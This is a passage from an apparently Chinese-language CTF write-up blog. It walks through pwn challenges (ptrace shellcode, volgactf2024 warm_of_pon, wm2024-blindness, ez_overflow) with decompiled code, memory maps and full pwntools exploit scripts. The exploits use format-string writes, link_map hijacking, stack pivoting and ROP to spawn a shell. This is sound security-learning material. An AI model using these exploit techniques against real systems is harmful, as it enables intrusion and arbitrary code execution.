class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: p.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span>: gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Pid: &#x27;</span>)</span><br><span class="line">pid=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;pid-&gt;&#x27;</span>+<span class="built_in">hex</span>(pid))</span><br><span class="line"> </span><br><span class="line">shellcode=shellcraft.ptrace(<span class="number">0x10</span>,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.ptrace(<span class="number">0x18</span>,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.wait4(pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.ptrace(<span class="number">12</span>,pid,<span class="number">0</span>,<span class="number">0x401500</span>)</span><br><span class="line">shellcode+=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   mov r9,0x401000</span></span><br><span class="line"><span class="string">   mov r8,0x401500</span></span><br><span class="line"><span class="string">   mov r11,qword ptr [r8+0x78]</span></span><br><span class="line"><span class="string">   mov r12,0</span></span><br><span class="line"><span class="string">   cmp r11,r12</span></span><br><span class="line"><span class="string">   je return</span></span><br><span class="line"><span class="string">   mov qword ptr [r8+0x80],r9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="comment">#如果是read调用则允许,并去到下一次syscall循环</span></span><br><span class="line">shellcode+=shellcraft.ptrace(<span class="number">13</span>,pid,<span class="number">0x401500</span>)+shellcraft.ptrace(<span class="number">17</span>,pid,<span class="number">0</span>,<span class="number">0</span>)+<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">return:</span></span><br><span class="line"><span class="string">    mov r13,0x401013</span></span><br><span class="line"><span class="string">    jmp r13</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sl(asm(shellcode))</span><br><span class="line">p.interactive()</span><br><span class="line"> </span><br><span class="line">r.sendline(asm(shellcraft.sh()))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="volgactf2024-warm-of-pon"><a href="#volgactf2024-warm-of-pon" class="headerlink" title="volgactf2024-warm_of_pon"></a>volgactf2024-warm_of_pon</h1><p>题目东西不多</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+30h] [rbp+0h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+38h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  *(&amp;savedregs - <span class="number">305</span>) = (<span class="type">unsigned</span> __int64)<span class="built_in">malloc</span>(<span class="number">8uLL</span>) &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL;</span><br><span class="line">  *(_QWORD *)*(&amp;savedregs - <span class="number">305</span>) = retaddr;</span><br><span class="line">  gets(format);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">0x20</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)((i &lt;&lt; <span class="number">12</span>) + *(&amp;savedregs - <span class="number">305</span>)) )</span><br><span class="line">      retaddr = *(<span class="type">void</span> **)((i &lt;&lt; <span class="number">12</span>) + *(&amp;savedregs - <span class="number">305</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一开始将retaddr保存到堆中,然后有一个栈溢出一个格式化字符串漏洞</p>
<p>直接修改栈上的返回地址是没有用的,因为格式化字符串漏洞之后会从堆上恢复之前保存的地址</p>
<p>一开始的思路是劫持.fini.array</p>
<p>但发现其没有写权限,后来一度没有思路</p>
<p>直到发现最后那个循环很奇怪,最后越看越觉得是爆破</p>
<p>那个循环就是为了加大爆破成功的概率,因为他会检查整个堆,并且以后找到的为返回地址,这极大提高了成功的概率(大概提了二十倍)</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;172.105.246.203&#x27;</span>, <span class="number">1339</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;%4555c%11$ln%117c%12$hhn&#x27;</span> + p64(<span class="number">0x568000</span>) + p64(<span class="number">0x568000</span> + <span class="number">2</span>)</span><br><span class="line">    <span class="comment">#0x568000是随便选的,只要在堆范围内就行</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">    output = sh.recvall()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;CTF&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    sh.close()</span><br></pre></td></tr></table></figure>
<h1 id="wm2024-blindness"><a href="#wm2024-blindness" class="headerlink" title="wm2024-blindness"></a>wm2024-blindness</h1><p>允许我们申请一个任意大小的chunk</p>
<p>之后再解释256字节的brainfuck</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sizea; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *size_4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Pls input the data size\n&quot;</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  sizea = readInt();</span><br><span class="line">  data = (__int64)<span class="built_in">malloc</span>(sizea);</span><br><span class="line">  <span class="keyword">if</span> ( !data )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Pls input the code size\n&quot;</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  size = readInt();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  size_4 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !size_4 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;error\n&quot;</span>, <span class="number">6uLL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(<span class="string">&quot;Pls input your code\n&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Pls input your code\n&quot;</span>, v4);</span><br><span class="line">  read(<span class="number">0</span>, size_4, size);</span><br><span class="line">  executeBrainfuck(size_4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其允许我们在申请出的堆块附近任意读写,但是只能向上读写</p>
<p>这要如何利用?</p>
<p>我们知道在malloc申请时,如果现有堆无法满足分配大小,会有两种情况,一种是抬高brk拓展现有堆,还有一种是直接使用mmap分配</p>
<p>当申请大小较大时会是第二种情况</p>
<p>且可以观察到,这种情况下,这个申请出来的堆块是于libc区域相邻的,也就是出题人给的hint</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x5625ff3e2000</span>     <span class="number">0x5625ff3e3000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e3000</span>     <span class="number">0x5625ff3e4000</span> r-xp     <span class="number">1000</span> <span class="number">1000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e4000</span>     <span class="number">0x5625ff3e5000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e5000</span>     <span class="number">0x5625ff3e6000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff3e6000</span>     <span class="number">0x5625ff3e7000</span> rw-p     <span class="number">1000</span> <span class="number">3000</span>   /home/ctf/pwn</span><br><span class="line">    <span class="number">0x5625ff6b3000</span>     <span class="number">0x5625ff6d4000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7f2a72e98000</span>     <span class="number">0x7f2a72f99000</span> rw-p   <span class="number">101000</span> <span class="number">0</span>      [anon_7f2a72e98]</span><br><span class="line">    <span class="number">0x7f2a72f99000</span>     <span class="number">0x7f2a72fbb000</span> r--p    <span class="number">22000</span> <span class="number">0</span>      /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a72fbb000</span>     <span class="number">0x7f2a73133000</span> r-xp   <span class="number">178000</span> <span class="number">22000</span>  /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73133000</span>     <span class="number">0x7f2a73181000</span> r--p    <span class="number">4e000</span> <span class="number">19</span>a000 /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73181000</span>     <span class="number">0x7f2a73185000</span> r--p     <span class="number">4000</span> <span class="number">1e7000</span> /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73185000</span>     <span class="number">0x7f2a73187000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>eb000 /home/ctf/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a73187000</span>     <span class="number">0x7f2a7318d000</span> rw-p     <span class="number">6000</span> <span class="number">0</span>      [anon_7f2a73187]</span><br><span class="line">    <span class="number">0x7f2a7318d000</span>     <span class="number">0x7f2a7318e000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a7318e000</span>     <span class="number">0x7f2a731b1000</span> r-xp    <span class="number">23000</span> <span class="number">1000</span>   /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731b1000</span>     <span class="number">0x7f2a731b9000</span> r--p     <span class="number">8000</span> <span class="number">24000</span>  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731ba000</span>     <span class="number">0x7f2a731bb000</span> r--p     <span class="number">1000</span> <span class="number">2</span>c000  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731bb000</span>     <span class="number">0x7f2a731bc000</span> rw-p     <span class="number">1000</span> <span class="number">2</span>d000  /home/ctf/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7f2a731bc000</span>     <span class="number">0x7f2a731bd000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      [anon_7f2a731bc]</span><br><span class="line">    <span class="number">0x7ffed494a000</span>     <span class="number">0x7ffed496b000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7ffed49f3000</span>     <span class="number">0x7ffed49f7000</span> r--p     <span class="number">4000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffed49f7000</span>     <span class="number">0x7ffed49f9000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure>
<p>也就是说题目中的chunk附近任意读写可以转换为libc/ld任意读写</p>
<p>考虑到只有一次机会,所以显然是要在无泄漏的情况下完成利用,修改stdout等结构体是行不通的</p>
<p>此时一个思路就是修改link_map的fini函数,是的函数退出时执行题目给的后门</p>
<p>一开始想叉了,想直接修改DT_FINI_ARRAY到DT_INIT_ARRAY,然后l_addr修改为9直接进入后门</p>
<p>但是发现这样会使得找fini_array的时候访问段错误,因为是从9+0x3d88找</p>
<p>所以最后还是选择修改DT_FINI使其指向0x3d80处,然后DT_FINI_ARRAY修改为NULL,l_addr保持为9</p>
<p>这样最后就会直接调用后门</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr,content</span>):</span><br><span class="line">    content = <span class="built_in">list</span>(content)</span><br><span class="line">    payload = <span class="string">&quot;@&quot;</span> + p32(addr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        payload += <span class="string">&#x27;.&#x27;</span> + p8(<span class="built_in">ord</span>(content[i]))</span><br><span class="line">        payload += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="number">0x100000</span>))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">    p.recv()</span><br><span class="line">    payload = write(<span class="number">0x338180</span>,p64(<span class="number">9</span>))</span><br><span class="line">    payload += write(<span class="number">0xa8</span>-<span class="number">8</span>,<span class="string">b&#x27;\x80&#x27;</span>)</span><br><span class="line">    payload += write(<span class="number">0x67</span>,p64(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line">    payload += <span class="string">&#x27;q&#x27;</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    binary = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">    context.binary = binary</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) == <span class="number">3</span>):</span><br><span class="line">        p = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(binary)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
<p>这都是建立在存在后门的情况下,此外如果没有后门,但同样有system也是能做的</p>
<p>发现到执行fini函数时,rdi固定为一个指向ld上可读写的段,在此之前现在这个位置写上<code>/bin/sh</code>即可,其他的只需要l_addr修改为system@plt与.init中值的差值即可</p>
<p>不过对其他更普遍的题而言,没啥太大的借鉴性,毕竟都有任意写的能力了,不如用其他方法</p>
<h1 id="ez-overflow"><a href="#ez-overflow" class="headerlink" title="ez_overflow"></a>ez_overflow</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401176(a1, a2, a3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hear stack overflow is pretty easy?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数十分简单,开头的那个<code>sub_401176</code>用于设置缓冲区没什么好说的</p>
<p>之后就是一个栈溢出但只能溢出8字节</p>
<p>第一思路肯定是栈迁移然后再次返回到read处,事实也确实如此</p>
<p>不过我们一次只能写0x18字节,这其中还包括了下一次需要使用的rbp和保存地址</p>
<p>因此真正有效的只有8个字节</p>
<p>那么显然是要多次调用read每次写8个字节,一步步布置rop流</p>
<p>第一次尝试的时候犯了一个错误,就是如果写完8字节之后直接跳转前往布置下一个8字节,就会因为栈迁移交替使得rbp与rsp靠的太近,从而写这一次rop流时会覆盖call read时保存的返回地址,进而段错误</p>
<p>解决办法就是每一次写完8个字节后,就将栈抬高到别处去,然后才再次返回到布置rop处,总之就是让rsp与rbp距离远一点</p>
<p>就是常规的rop加了一点套路</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./ez&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">	<span class="keyword">if</span>(script):</span><br><span class="line">		gdb.attach(p, script)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line">		pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		<span class="keyword">return</span> process(elf_path)</span><br><span class="line">	<span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401185</span></span><br><span class="line">leave_ret=<span class="number">0x401208</span></span><br><span class="line">bss1=<span class="number">0x404600</span></span><br><span class="line">bss2=<span class="number">0x404800</span></span><br><span class="line">main_read=<span class="number">0x4011ed</span></span><br><span class="line">ret=<span class="number">0x4010C4</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;easy?\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1)+p64(main_read))</span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(bss2)+p64(main_read))<span class="comment">#这里binsh写早了,导致之后被覆盖了,但懒得改了</span></span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x8</span>)+p64(main_read))</span><br><span class="line">s(p64(bss2)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x10</span>)+p64(main_read))</span><br><span class="line">s(p64(pop_rdi_ret)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x18</span>)+p64(main_read))</span><br><span class="line">s(p64(<span class="number">0x403FE8</span>)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x20</span>)+p64(main_read))</span><br><span class="line">s(p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(bss2)+p64(main_read))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss1+<span class="number">0x28</span>)+p64(main_read))</span><br><span class="line">s(p64(<span class="number">0x4011ED</span>)+p64(bss1)+p64(leave_ret))</span><br><span class="line"></span><br><span class="line">read_addr=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x58</span>)+p64(main_read))</span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x60</span>)+p64(main_read))</span><br><span class="line">s(p64(pop_rdi_ret)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span 